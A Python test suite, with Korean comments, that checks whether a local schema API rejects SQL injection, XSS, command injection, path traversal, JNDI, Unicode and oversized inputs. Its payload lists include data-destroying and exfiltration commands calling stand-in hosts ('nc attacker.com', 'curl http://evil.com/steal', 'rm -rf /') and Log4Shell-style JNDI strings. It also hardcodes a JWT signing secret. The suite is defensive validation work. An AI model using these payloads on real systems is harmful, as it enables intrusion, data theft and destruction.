#!/usr/bin/env python
"""
Enterprise Validation Comprehensive Test Suite
실제로 모든 보안 위협을 차단하는지 검증
"""
import httpx
import jwt
import asyncio
import json
import time
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Any
import statistics

# JWT 토큰 생성
def generate_jwt():
    secret = "FDIRdP4Zu1q8yMt+qCpKaBBo6C937PWGtnW8E94dPA8="
    payload = {
        "sub": "testuser",
        "user_id": "test-user-123",
        "username": "testuser",
        "email": "test@example.com",
        "exp": datetime.now(timezone.utc) + timedelta(hours=1)
    }
    return jwt.encode(payload, secret, algorithm="HS256")

class ValidationTester:
    def __init__(self, base_url: str = "http://localhost:8002"):
        self.base_url = base_url
        self.token = generate_jwt()
        self.headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        }
        self.results = []
        
    async def test_endpoint(self, method: str, url: str, json_data: Dict[str, Any], 
                          expected_status: int, test_name: str) -> Dict[str, Any]:
        """개별 엔드포인트 테스트"""
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            start_time = time.time()
            
            if method == "POST":
                response = await client.post(url, json=json_data)
            elif method == "PUT":
                response = await client.put(url, json=json_data)
            elif method == "GET":
                response = await client.get(url)
            else:
                raise ValueError(f"Unsupported method: {method}")
                
            elapsed = (time.time() - start_time) * 1000  # ms
            
            result = {
                "test_name": test_name,
                "url": url,
                "method": method,
                "expected_status": expected_status,
                "actual_status": response.status_code,
                "passed": response.status_code == expected_status,
                "response_time_ms": elapsed,
                "response_body": response.text[:500] if response.text else None
            }
            
            # 에러 메시지에서 민감한 정보 유출 확인
            if response.status_code >= 400:
                sensitive_patterns = [
                    "DROP TABLE", "INSERT INTO", "DELETE FROM",  # SQL
                    "/Users/", "/home/", "C:\\",  # 파일 경로
                    "localhost:", "127.0.0.1:", "192.168.",  # 내부 IP
                    "at line", "File \"", "Traceback",  # 스택 트레이스
                    "jndi:", "ldap:", "rmi:",  # JNDI injection
                    "<script>", "javascript:", "onerror=",  # XSS
                ]
                
                response_text = response.text.lower() if response.text else ""
                leaked_info = []
                for pattern in sensitive_patterns:
                    if pattern.lower() in response_text:
                        leaked_info.append(pattern)
                        
                result["leaked_sensitive_info"] = leaked_info
                result["info_disclosure"] = len(leaked_info) > 0
            
            self.results.append(result)
            return result
    
    async def run_comprehensive_tests(self):
        """포괄적인 테스트 실행"""
        print("\n" + "="*80)
        print("ENTERPRISE VALIDATION COMPREHENSIVE TEST SUITE")
        print("="*80)
        
        # 1. SQL Injection 테스트 - 모든 엔드포인트
        print("\n1. SQL INJECTION TESTS - ALL ENDPOINTS")
        print("-"*60)
        
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "\" OR 1=1 --",
            "'; INSERT INTO admins VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM passwords --"
        ]
        
        endpoints = [
            ("POST", "/api/v1/schemas/main/object-types", "ObjectType"),
            ("POST", "/api/v1/schemas/main/shared-properties", "SharedProperty"),
            ("POST", "/api/v1/schemas/main/link-types", "LinkType"),
            ("POST", "/api/v1/schemas/main/action-types", "ActionType"),
            ("POST", "/api/v1/schemas/main/interfaces", "Interface"),
            ("POST", "/api/v1/schemas/main/semantic-types", "SemanticType"),
            ("POST", "/api/v1/schemas/main/struct-types", "StructType"),
        ]
        
        for endpoint_method, endpoint_path, entity_type in endpoints:
            for payload in sql_payloads:
                test_data = self.get_test_data(entity_type, payload)
                result = await self.test_endpoint(
                    endpoint_method,
                    f"{self.base_url}{endpoint_path}",
                    test_data,
                    400,  # Should be 400 Bad Request
                    f"SQL Injection - {entity_type} - {payload[:20]}..."
                )
                
                status = "✅ BLOCKED" if result["passed"] else "❌ FAILED"
                info_leak = "🚨 INFO LEAKED" if result.get("info_disclosure") else "✅ SAFE"
                print(f"{status} {info_leak} - {entity_type}: {payload[:30]}...")
        
        # 2. XSS 테스트
        print("\n2. CROSS-SITE SCRIPTING (XSS) TESTS")
        print("-"*60)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert()'>"
        ]
        
        for endpoint_method, endpoint_path, entity_type in endpoints:
            for payload in xss_payloads:
                test_data = self.get_test_data(entity_type, f"Test{payload}")
                result = await self.test_endpoint(
                    endpoint_method,
                    f"{self.base_url}{endpoint_path}",
                    test_data,
                    400,
                    f"XSS - {entity_type} - {payload[:20]}..."
                )
                
                status = "✅ BLOCKED" if result["passed"] else "❌ FAILED"
                info_leak = "🚨 INFO LEAKED" if result.get("info_disclosure") else "✅ SAFE"
                print(f"{status} {info_leak} - {entity_type}: {payload[:30]}...")
        
        # 3. Command Injection 테스트
        print("\n3. COMMAND INJECTION TESTS")
        print("-"*60)
        
        cmd_payloads = [
            "`rm -rf /`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| nc attacker.com 1234",
            "&& curl http://evil.com/steal"
        ]
        
        for endpoint_method, endpoint_path, entity_type in endpoints:
            for payload in cmd_payloads:
                test_data = self.get_test_data(entity_type, f"Test{payload}")
                result = await self.test_endpoint(
                    endpoint_method,
                    f"{self.base_url}{endpoint_path}",
                    test_data,
                    400,
                    f"CMD Injection - {entity_type} - {payload[:20]}..."
                )
                
                status = "✅ BLOCKED" if result["passed"] else "❌ FAILED"
                info_leak = "🚨 INFO LEAKED" if result.get("info_disclosure") else "✅ SAFE"
                print(f"{status} {info_leak} - {entity_type}: {payload[:30]}...")
        
        # 4. Path Traversal 테스트
        print("\n4. PATH TRAVERSAL TESTS")
        print("-"*60)
        
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for payload in path_payloads:
            # 🔥 Path traversal은 이제 미들웨어에서 400으로 차단됨
            # URL 인코딩을 통해 실제 공격 시뮬레이션
            import urllib.parse
            encoded_payload = urllib.parse.quote(payload, safe='')
            
            result = await self.test_endpoint(
                "GET",
                f"{self.base_url}/api/v1/schemas/{encoded_payload}/object-types",
                None,
                400,  # 미들웨어에서 400으로 차단되어야 함
                f"Path Traversal - {payload[:30]}..."
            )
            
            status = "✅ BLOCKED" if result["passed"] else "❌ FAILED"
            info_leak = "🚨 INFO LEAKED" if result.get("info_disclosure") else "✅ SAFE"
            print(f"{status} {info_leak} - {payload[:40]}...")
        
        # 5. LDAP/JNDI Injection 테스트
        print("\n5. LDAP/JNDI INJECTION TESTS")
        print("-"*60)
        
        jndi_payloads = [
            "${jndi:ldap://attacker.com/exploit}",
            "${jndi:rmi://malicious.com/Object}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com}"
        ]
        
        for endpoint_method, endpoint_path, entity_type in endpoints[:3]:  # Test first 3 endpoints
            for payload in jndi_payloads:
                test_data = self.get_test_data(entity_type, f"Test{payload}")
                result = await self.test_endpoint(
                    endpoint_method,
                    f"{self.base_url}{endpoint_path}",
                    test_data,
                    400,
                    f"JNDI - {entity_type} - {payload[:30]}..."
                )
                
                status = "✅ BLOCKED" if result["passed"] else "❌ FAILED"
                info_leak = "🚨 INFO LEAKED" if result.get("info_disclosure") else "✅ SAFE"
                print(f"{status} {info_leak} - {entity_type}: {payload[:40]}...")
        
        # 6. Unicode/Encoding 공격
        print("\n6. UNICODE/ENCODING ATTACK TESTS")
        print("-"*60)
        
        unicode_payloads = [
            "Test\u200b\u200c\u200d",  # Zero-width characters
            "Test\u202e\u202d",  # Right-to-left override
            "Test\ufeff",  # Zero-width no-break space
            "Test\x00null",  # Null byte injection
            "Tëst\u0301",  # Combining diacritical marks
        ]
        
        for payload in unicode_payloads:
            result = await self.test_endpoint(
                "POST",
                f"{self.base_url}/api/v1/schemas/main/object-types",
                {"name": payload, "displayName": "Test"},
                400,
                f"Unicode - {repr(payload[:20])}..."
            )
            
            status = "✅ BLOCKED" if result["passed"] else "❌ FAILED"
            print(f"{status} - {repr(payload[:30])}...")
        
        # 7. 대용량 페이로드 테스트
        print("\n7. LARGE PAYLOAD TESTS")
        print("-"*60)
        
        large_payloads = [
            ("1KB name", "A" * 1000),
            ("10KB name", "B" * 10000),
            ("100KB name", "C" * 100000),
            ("1MB description", {"name": "Test", "description": "D" * 1000000})
        ]
        
        for test_name, payload in large_payloads:
            if isinstance(payload, str):
                test_data = {"name": payload, "displayName": "Test"}
            else:
                test_data = payload
                
            result = await self.test_endpoint(
                "POST",
                f"{self.base_url}/api/v1/schemas/main/object-types",
                test_data,
                400,  # Should reject large payloads
                f"Large Payload - {test_name}"
            )
            
            status = "✅ BLOCKED" if result["passed"] else "❌ FAILED"
            print(f"{status} - {test_name}: {result['response_time_ms']:.2f}ms")
        
        # 8. 동시성 테스트
        print("\n8. CONCURRENT REQUEST TESTS")
        print("-"*60)
        
        async def concurrent_create(index: int):
            """동시 생성 시도 - 고유한 이름으로"""
            import uuid
            unique_id = str(uuid.uuid4())[:8]
            return await self.test_endpoint(
                "POST",
                f"{self.base_url}/api/v1/schemas/main/object-types",
                {
                    "name": f"Concurrent{unique_id}{index}",
                    "displayName": f"Concurrent Test {index}",
                    "description": f"Concurrent test object {index}"
                },
                200,  # 각각 성공해야 함
                f"Concurrent-{index}"
            )
        
        # 100개 동시 요청
        tasks = [concurrent_create(i) for i in range(100)]
        results = await asyncio.gather(*tasks)
        
        success_count = sum(1 for r in results if r["passed"])
        response_times = [r["response_time_ms"] for r in results]
        
        print(f"Concurrent creates: {success_count}/100 succeeded")
        print(f"Average response time: {statistics.mean(response_times):.2f}ms")
        print(f"P95 response time: {statistics.quantiles(response_times, n=20)[18]:.2f}ms")
        print(f"P99 response time: {statistics.quantiles(response_times, n=100)[98]:.2f}ms")
        
        # 9. Validation 메트릭스 확인
        print("\n9. VALIDATION METRICS CHECK")
        print("-"*60)
        
        async with httpx.AsyncClient(headers=self.headers) as client:
            response = await client.get(f"{self.base_url}/api/v1/validation/metrics")
            if response.status_code == 200:
                metrics = response.json()
                print(f"Total validations: {metrics.get('total_validations', 0)}")
                print(f"Failed validations: {metrics.get('failed_validations', 0)}")
                print(f"Average response time: {metrics.get('avg_response_time_ms', 0):.2f}ms")
                print(f"Cache hit rate: {metrics.get('cache_hit_rate', 0):.2%}")
                print(f"Security threats detected: {metrics.get('security_threats_detected', 0)}")
            else:
                print(f"❌ Failed to get metrics: {response.status_code}")
        
        # 10. 정상 케이스 테스트 - 고유한 이름으로 생성
        print("\n10. VALID CASE TESTS")
        print("-"*60)
        
        import uuid
        test_id = str(uuid.uuid4())[:8]  # 고유 ID 생성
        
        valid_cases = [
            (f"SimpleObj{test_id}", "Simple Object", "A simple test object"),
            (f"ComplexObj{test_id}", "Complex Object 123", "Object with numbers"),
            (f"ObjUnder{test_id}", "Underscored Object", "Test object"),
            (f"CamelObj{test_id}", "Camel Case Object", "Testing camel case")
        ]
        
        for name, display_name, description in valid_cases:
            result = await self.test_endpoint(
                "POST",
                f"{self.base_url}/api/v1/schemas/main/object-types",
                {
                    "name": name,
                    "displayName": display_name,
                    "description": description
                },
                200,
                f"Valid - {name}"
            )
            
            status = "✅ PASSED" if result["passed"] else "❌ FAILED"
            print(f"{status} - {name}")
        
        # 최종 결과 요약
        self.print_summary()
    
    def get_test_data(self, entity_type: str, malicious_value: str) -> Dict[str, Any]:
        """엔티티 타입별 테스트 데이터 생성"""
        base_data = {
            "name": malicious_value,
            "displayName": "Test Display",
            "description": "Test description"
        }
        
        # 엔티티별 추가 필드
        if entity_type == "Property":
            base_data["dataType"] = "xsd:string"
            base_data["required"] = False
        elif entity_type == "SharedProperty":
            base_data["dataType"] = "xsd:string"
        elif entity_type == "LinkType":
            base_data["sourceObjectType"] = "TestSource"
            base_data["targetObjectType"] = "TestTarget"
            base_data["cardinality"] = "one-to-many"
        elif entity_type == "ActionType":
            base_data["targetTypes"] = ["TestType"]
            base_data["operations"] = ["create:object"]
        elif entity_type == "Interface":
            base_data["properties"] = []
            base_data["sharedProperties"] = []
        elif entity_type == "SemanticType":
            base_data["baseType"] = "xsd:string"
            base_data["validationRules"] = []
        elif entity_type == "StructType":
            base_data["fields"] = [
                {
                    "name": "field1",
                    "displayName": "Field 1",
                    "fieldType": "xsd:string",
                    "required": True
                }
            ]
        
        return base_data
    
    def print_summary(self):
        """테스트 결과 요약"""
        print("\n" + "="*80)
        print("TEST SUMMARY")
        print("="*80)
        
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r["passed"])
        failed_tests = total_tests - passed_tests
        info_leaks = sum(1 for r in self.results if r.get("info_disclosure", False))
        
        print(f"\nTotal Tests: {total_tests}")
        print(f"Passed: {passed_tests} ({passed_tests/total_tests*100:.1f}%)")
        print(f"Failed: {failed_tests} ({failed_tests/total_tests*100:.1f}%)")
        print(f"Information Leaks: {info_leaks}")
        
        # 실패한 테스트 상세
        if failed_tests > 0:
            print("\n❌ FAILED TESTS:")
            for result in self.results:
                if not result["passed"]:
                    print(f"  - {result['test_name']}")
                    print(f"    Expected: {result['expected_status']}, Got: {result['actual_status']}")
                    if result.get("leaked_sensitive_info"):
                        print(f"    🚨 Leaked: {', '.join(result['leaked_sensitive_info'])}")
        
        # 정보 유출 상세
        if info_leaks > 0:
            print("\n🚨 INFORMATION DISCLOSURE ISSUES:")
            for result in self.results:
                if result.get("info_disclosure"):
                    print(f"  - {result['test_name']}")
                    print(f"    Leaked: {', '.join(result.get('leaked_sensitive_info', []))}")
        
        # 성능 통계
        response_times = [r["response_time_ms"] for r in self.results if r["response_time_ms"]]
        if response_times:
            print(f"\n⏱️  PERFORMANCE STATISTICS:")
            print(f"  Average: {statistics.mean(response_times):.2f}ms")
            print(f"  Median: {statistics.median(response_times):.2f}ms")
            print(f"  Min: {min(response_times):.2f}ms")
            print(f"  Max: {max(response_times):.2f}ms")
        
        # 최종 판정
        print("\n" + "="*80)
        if failed_tests == 0 and info_leaks == 0:
            print("✅ ALL TESTS PASSED - SYSTEM IS SECURE")
        else:
            print("❌ SECURITY ISSUES DETECTED - SYSTEM IS VULNERABLE")
        print("="*80)

async def main():
    """메인 실행 함수"""
    tester = ValidationTester()
    await tester.run_comprehensive_tests()

if __name__ == "__main__":
    asyncio.run(main())